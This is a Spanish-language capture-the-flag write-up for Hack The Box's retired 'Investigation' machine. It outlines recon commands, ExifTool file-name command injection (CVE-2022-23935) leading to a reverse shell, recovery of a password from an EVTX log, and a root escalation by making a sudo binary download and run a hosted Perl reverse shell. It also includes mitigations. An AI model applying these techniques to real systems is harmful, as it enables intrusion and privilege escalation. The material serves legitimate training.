---
machine: Investigation
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, exiftool, cve-2022-23935, evtx, reversing, perl]
---

# Investigation — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un portal forense ejecuta ExifTool 12.37 sobre las imágenes. CVE-2022-23935 permite inyectar comandos en el nombre del archivo y obtener `www-data`; un registro EVTX accesible revela la contraseña de `smorton`. `sudo binary` descarga una URL y la ejecuta con Perl como root, lo que completa la escalada.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p22,80 <IP>
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://<IP>/FUZZ
```

## Enumeración

- La web permite subir imágenes y genera un informe con ExifTool 12.37.
- Los reportes quedan en `/var/www/html/reports` y son accesibles.
- Hay un EVTX de Windows y archivos de `smorton` en el sistema.

## Acceso inicial

Se sube una imagen cuyo nombre contiene metacaracteres; ExifTool los interpreta al construir el comando y ejecuta una reverse shell como `www-data`. El EVTX se copia y se analiza con `evtx_dump.py` o `strings` para recuperar la contraseña de `smorton`, válida por SSH.

## Escalada de privilegios

`sudo -l` permite `/usr/bin/binary`. El binario exige dos argumentos, comprueba que se ejecuta como root y que el segundo sea `lDnxUysaQn`; descarga la URL del primero en ese archivo y ejecuta `perl ./lDnxUysaQn`. Se aloja un Perl reverse shell y se llama `sudo binary <URL> lDnxUysaQn`.

## Evidencia

- Nombre de archivo con la inyección y conexión de `www-data`.
- EVTX con la contraseña de `smorton`.
- Descarga de `shell.pl` por `binary` y shell de root.

## Lecciones aprendidas

- Las herramientas que construyen comandos con nombres de archivo son peligrosas.
- Los artefactos forenses pueden contener credenciales.
- Un binario que descarga y ejecuta código como root es una puerta directa.

## Mitigación y detección

- Actualizar ExifTool y usar `--`/argumentos separados.
- Restringir la lectura de EVTX y rotar credenciales.
- No permitir que un binario con sudo descargue y ejecute contenido arbitrario.

## Referencias

- [0xdf — Investigation](https://0xdf.gitlab.io/2023/04/22/htb-investigation.html)
- [IppSec — Investigation](https://www.youtube.com/watch?v=X5hVEuWmehk)
- [Hack The Box — Investigation](https://app.hackthebox.com/machines/investigation)
